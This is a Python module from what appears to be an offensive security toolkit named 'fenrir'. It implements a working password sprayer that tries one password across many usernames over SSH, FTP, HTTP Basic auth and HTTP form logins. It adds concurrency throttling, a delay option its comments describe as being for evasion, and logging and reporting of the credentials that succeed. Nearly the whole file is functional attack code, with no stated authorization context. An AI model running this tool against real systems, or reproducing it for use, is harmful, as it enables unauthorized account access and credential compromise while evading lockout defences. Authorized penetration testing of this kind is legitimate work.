# fenrir/modules/password_sprayer.py
#
# Fix 16 — Changes from original:
#   - asyncio.Semaphore(concurrency) now actually limits concurrent attempts
#     (original created tasks with no throttling — would flood the target)
#   - Added service parameter routing: "ssh", "ftp", "http-basic", "http-form"
#   - SSH: full paramiko implementation (unchanged from original, now semaphore-gated)
#   - FTP: asyncio ftplib via to_thread
#   - HTTP-basic / HTTP-form: httpx async implementation
#   - Each service stub is clearly documented — easy to add new protocols
#   - Rate limiting: configurable delay_between_attempts (default 0.0s) for evasion
#   - ReportManager integration — structured findings with timestamp
#   - run() returns list of (username, password) tuples for successful logins
#   - Graceful keyboard-interrupt handling: stops new tasks, returns partial results

import asyncio
import ftplib
import time
from datetime import datetime, timezone
from typing import Optional

import httpx
import paramiko

from fenrir.logging_config import get_logger
from fenrir.report_manager import ReportManager

log = get_logger()

# Supported services
SUPPORTED_SERVICES = ("ssh", "ftp", "http-basic", "http-form")


class PasswordSprayer:
    """
    Performs a password spraying attack against a target service.

    Supported services:
      ssh        — Paramiko-based SSH authentication
      ftp        — ftplib FTP authentication
      http-basic — HTTP Basic Authentication (RFC 7617)
      http-form  — HTTP form POST (configurable field names)

    Concurrency is enforced via asyncio.Semaphore so the target is never
    flooded beyond the specified concurrency limit.
    """

    def __init__(self) -> None:
        log.debug("PasswordSprayer initialised.")

    async def run(
        self,
        target_ip: str,
        port: int,
        usernames: list[str],
        password: str,
        service: str = "ssh",
        concurrency: int = 5,
        delay: float = 0.0,
        timeout: float = 8.0,
        http_url: Optional[str] = None,
        http_user_field: str = "username",
        http_pass_field: str = "password",
        report: Optional[ReportManager] = None,
    ) -> list[tuple[str, str]]:
        """
        Spray a single password across multiple usernames.

        Args:
            target_ip:        Target host IP or hostname.
            port:             Target port.
            usernames:        List of usernames to attempt.
            password:         Single password to spray.
            service:          Service type: "ssh", "ftp", "http-basic", "http-form".
            concurrency:      Maximum concurrent login attempts. Default 5.
            delay:            Seconds to pause between releasing semaphore slots (evasion).
            timeout:          Per-attempt timeout in seconds. Default 8.0.
            http_url:         Full URL for HTTP services (overrides target_ip:port).
            http_user_field:  Form field name for username in http-form mode.
            http_pass_field:  Form field name for password in http-form mode.
            report:           Optional ReportManager.

        Returns:
            List of (username, password) tuples for every successful login.
        """
        service = service.lower()
        if service not in SUPPORTED_SERVICES:
            log.error(
                f"Unsupported service '{service}'. "
                f"Supported: {', '.join(SUPPORTED_SERVICES)}"
            )
            return []

        log.info(
            f"Password spray: {target_ip}:{port} [{service.upper()}] "
            f"— {len(usernames)} usernames, password='{password}', "
            f"concurrency={concurrency}"
        )

        semaphore = asyncio.Semaphore(concurrency)
        successes: list[tuple[str, str]] = []
        stop_event = asyncio.Event()

        async def attempt(username: str) -> None:
            if stop_event.is_set():
                return
            async with semaphore:
                if stop_event.is_set():
                    return
                result = await self._dispatch(
                    service, target_ip, port, username, password,
                    timeout, http_url, http_user_field, http_pass_field,
                )
                if result:
                    successes.append((username, password))
                    log.warning(
                        f"  *** SUCCESS: {username}:{password} @ "
                        f"{target_ip}:{port} [{service}]"
                    )
                if delay > 0:
                    await asyncio.sleep(delay)

        # Gather all attempts, handle keyboard interrupt gracefully
        try:
            await asyncio.gather(*[attempt(u) for u in usernames])
        except asyncio.CancelledError:
            log.warning("Password spray cancelled — returning partial results.")

        # --- Summary ---
        if successes:
            log.warning(
                f"Spray complete: {len(successes)}/{len(usernames)} "
                f"credential(s) valid."
            )
        else:
            log.info(
                f"Spray complete: no valid credentials found for "
                f"password '{password}'."
            )

        # --- ReportManager ---
        if report:
            findings = [
                {
                    "target":   f"{target_ip}:{port}",
                    "service":  service,
                    "username": u,
                    "password": p,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                }
                for u, p in successes
            ]
            if findings:
                report.add_section("Password Spray — Valid Credentials", findings)
            else:
                report.add_section(
                    "Password Spray",
                    [f"No valid credentials found for password '{password}' "
                     f"across {len(usernames)} username(s)."],
                )

        return successes

    # ------------------------------------------------------------------
    # Service dispatcher
    # ------------------------------------------------------------------

    async def _dispatch(
        self,
        service: str,
        host: str,
        port: int,
        username: str,
        password: str,
        timeout: float,
        http_url: Optional[str],
        user_field: str,
        pass_field: str,
    ) -> bool:
        """Route to the correct protocol handler. Returns True on success."""
        if service == "ssh":
            return await asyncio.to_thread(
                self._try_ssh, host, port, username, password, timeout
            )
        elif service == "ftp":
            return await asyncio.to_thread(
                self._try_ftp, host, port, username, password, timeout
            )
        elif service == "http-basic":
            url = http_url or f"http://{host}:{port}/"
            return await self._try_http_basic(url, username, password, timeout)
        elif service == "http-form":
            url = http_url or f"http://{host}:{port}/login"
            return await self._try_http_form(
                url, username, password, user_field, pass_field, timeout
            )
        return False

    # ------------------------------------------------------------------
    # SSH
    # ------------------------------------------------------------------

    def _try_ssh(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        timeout: float,
    ) -> bool:
        """Attempt a single SSH login. Returns True on success."""
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                auth_timeout=timeout,
                banner_timeout=timeout,
                look_for_keys=False,
                allow_agent=False,
            )
            return True
        except paramiko.AuthenticationException:
            log.debug(f"SSH fail: {username}@{host}:{port}")
            return False
        except paramiko.SSHException as exc:
            log.debug(f"SSH error ({username}): {exc}")
            return False
        except Exception as exc:
            log.debug(f"SSH connection error ({username}): {exc}")
            return False
        finally:
            client.close()

    # ------------------------------------------------------------------
    # FTP
    # ------------------------------------------------------------------

    def _try_ftp(
        self,
        host: str,
        port: int,
        username: str,
        password: str,
        timeout: float,
    ) -> bool:
        """Attempt a single FTP login. Returns True on success."""
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, port, timeout=timeout)
            ftp.login(username, password)
            ftp.quit()
            return True
        except ftplib.error_perm:
            log.debug(f"FTP fail: {username}@{host}:{port}")
            return False
        except Exception as exc:
            log.debug(f"FTP error ({username}): {exc}")
            return False

    # ------------------------------------------------------------------
    # HTTP Basic Auth
    # ------------------------------------------------------------------

    async def _try_http_basic(
        self,
        url: str,
        username: str,
        password: str,
        timeout: float,
    ) -> bool:
        """Attempt HTTP Basic Authentication. Returns True on 2xx response."""
        try:
            async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
                resp = await client.get(url, auth=(username, password))
            if resp.status_code < 300:
                return True
            log.debug(f"HTTP-basic fail ({username}): HTTP {resp.status_code}")
            return False
        except Exception as exc:
            log.debug(f"HTTP-basic error ({username}): {exc}")
            return False

    # ------------------------------------------------------------------
    # HTTP Form POST
    # ------------------------------------------------------------------

    async def _try_http_form(
        self,
        url: str,
        username: str,
        password: str,
        user_field: str,
        pass_field: str,
        timeout: float,
    ) -> bool:
        """
        Attempt an HTTP form POST login.

        Success is inferred by the absence of common failure indicators
        (login page keywords, 401/403 status codes) after the POST.
        This is a best-effort heuristic — adjust failure_indicators for
        specific targets.
        """
        failure_indicators = [
            "invalid", "incorrect", "wrong", "failed", "error",
            "invalid credentials", "please try again", "login failed",
            "authentication failed",
        ]
        try:
            async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as client:
                resp = await client.post(
                    url,
                    data={user_field: username, pass_field: password},
                )

            if resp.status_code in (401, 403):
                return False

            body_lower = resp.text.lower()
            if any(fi in body_lower for fi in failure_indicators):
                log.debug(f"HTTP-form fail ({username}): failure indicator found in response")
                return False

            return True

        except Exception as exc:
            log.debug(f"HTTP-form error ({username}): {exc}")
            return False
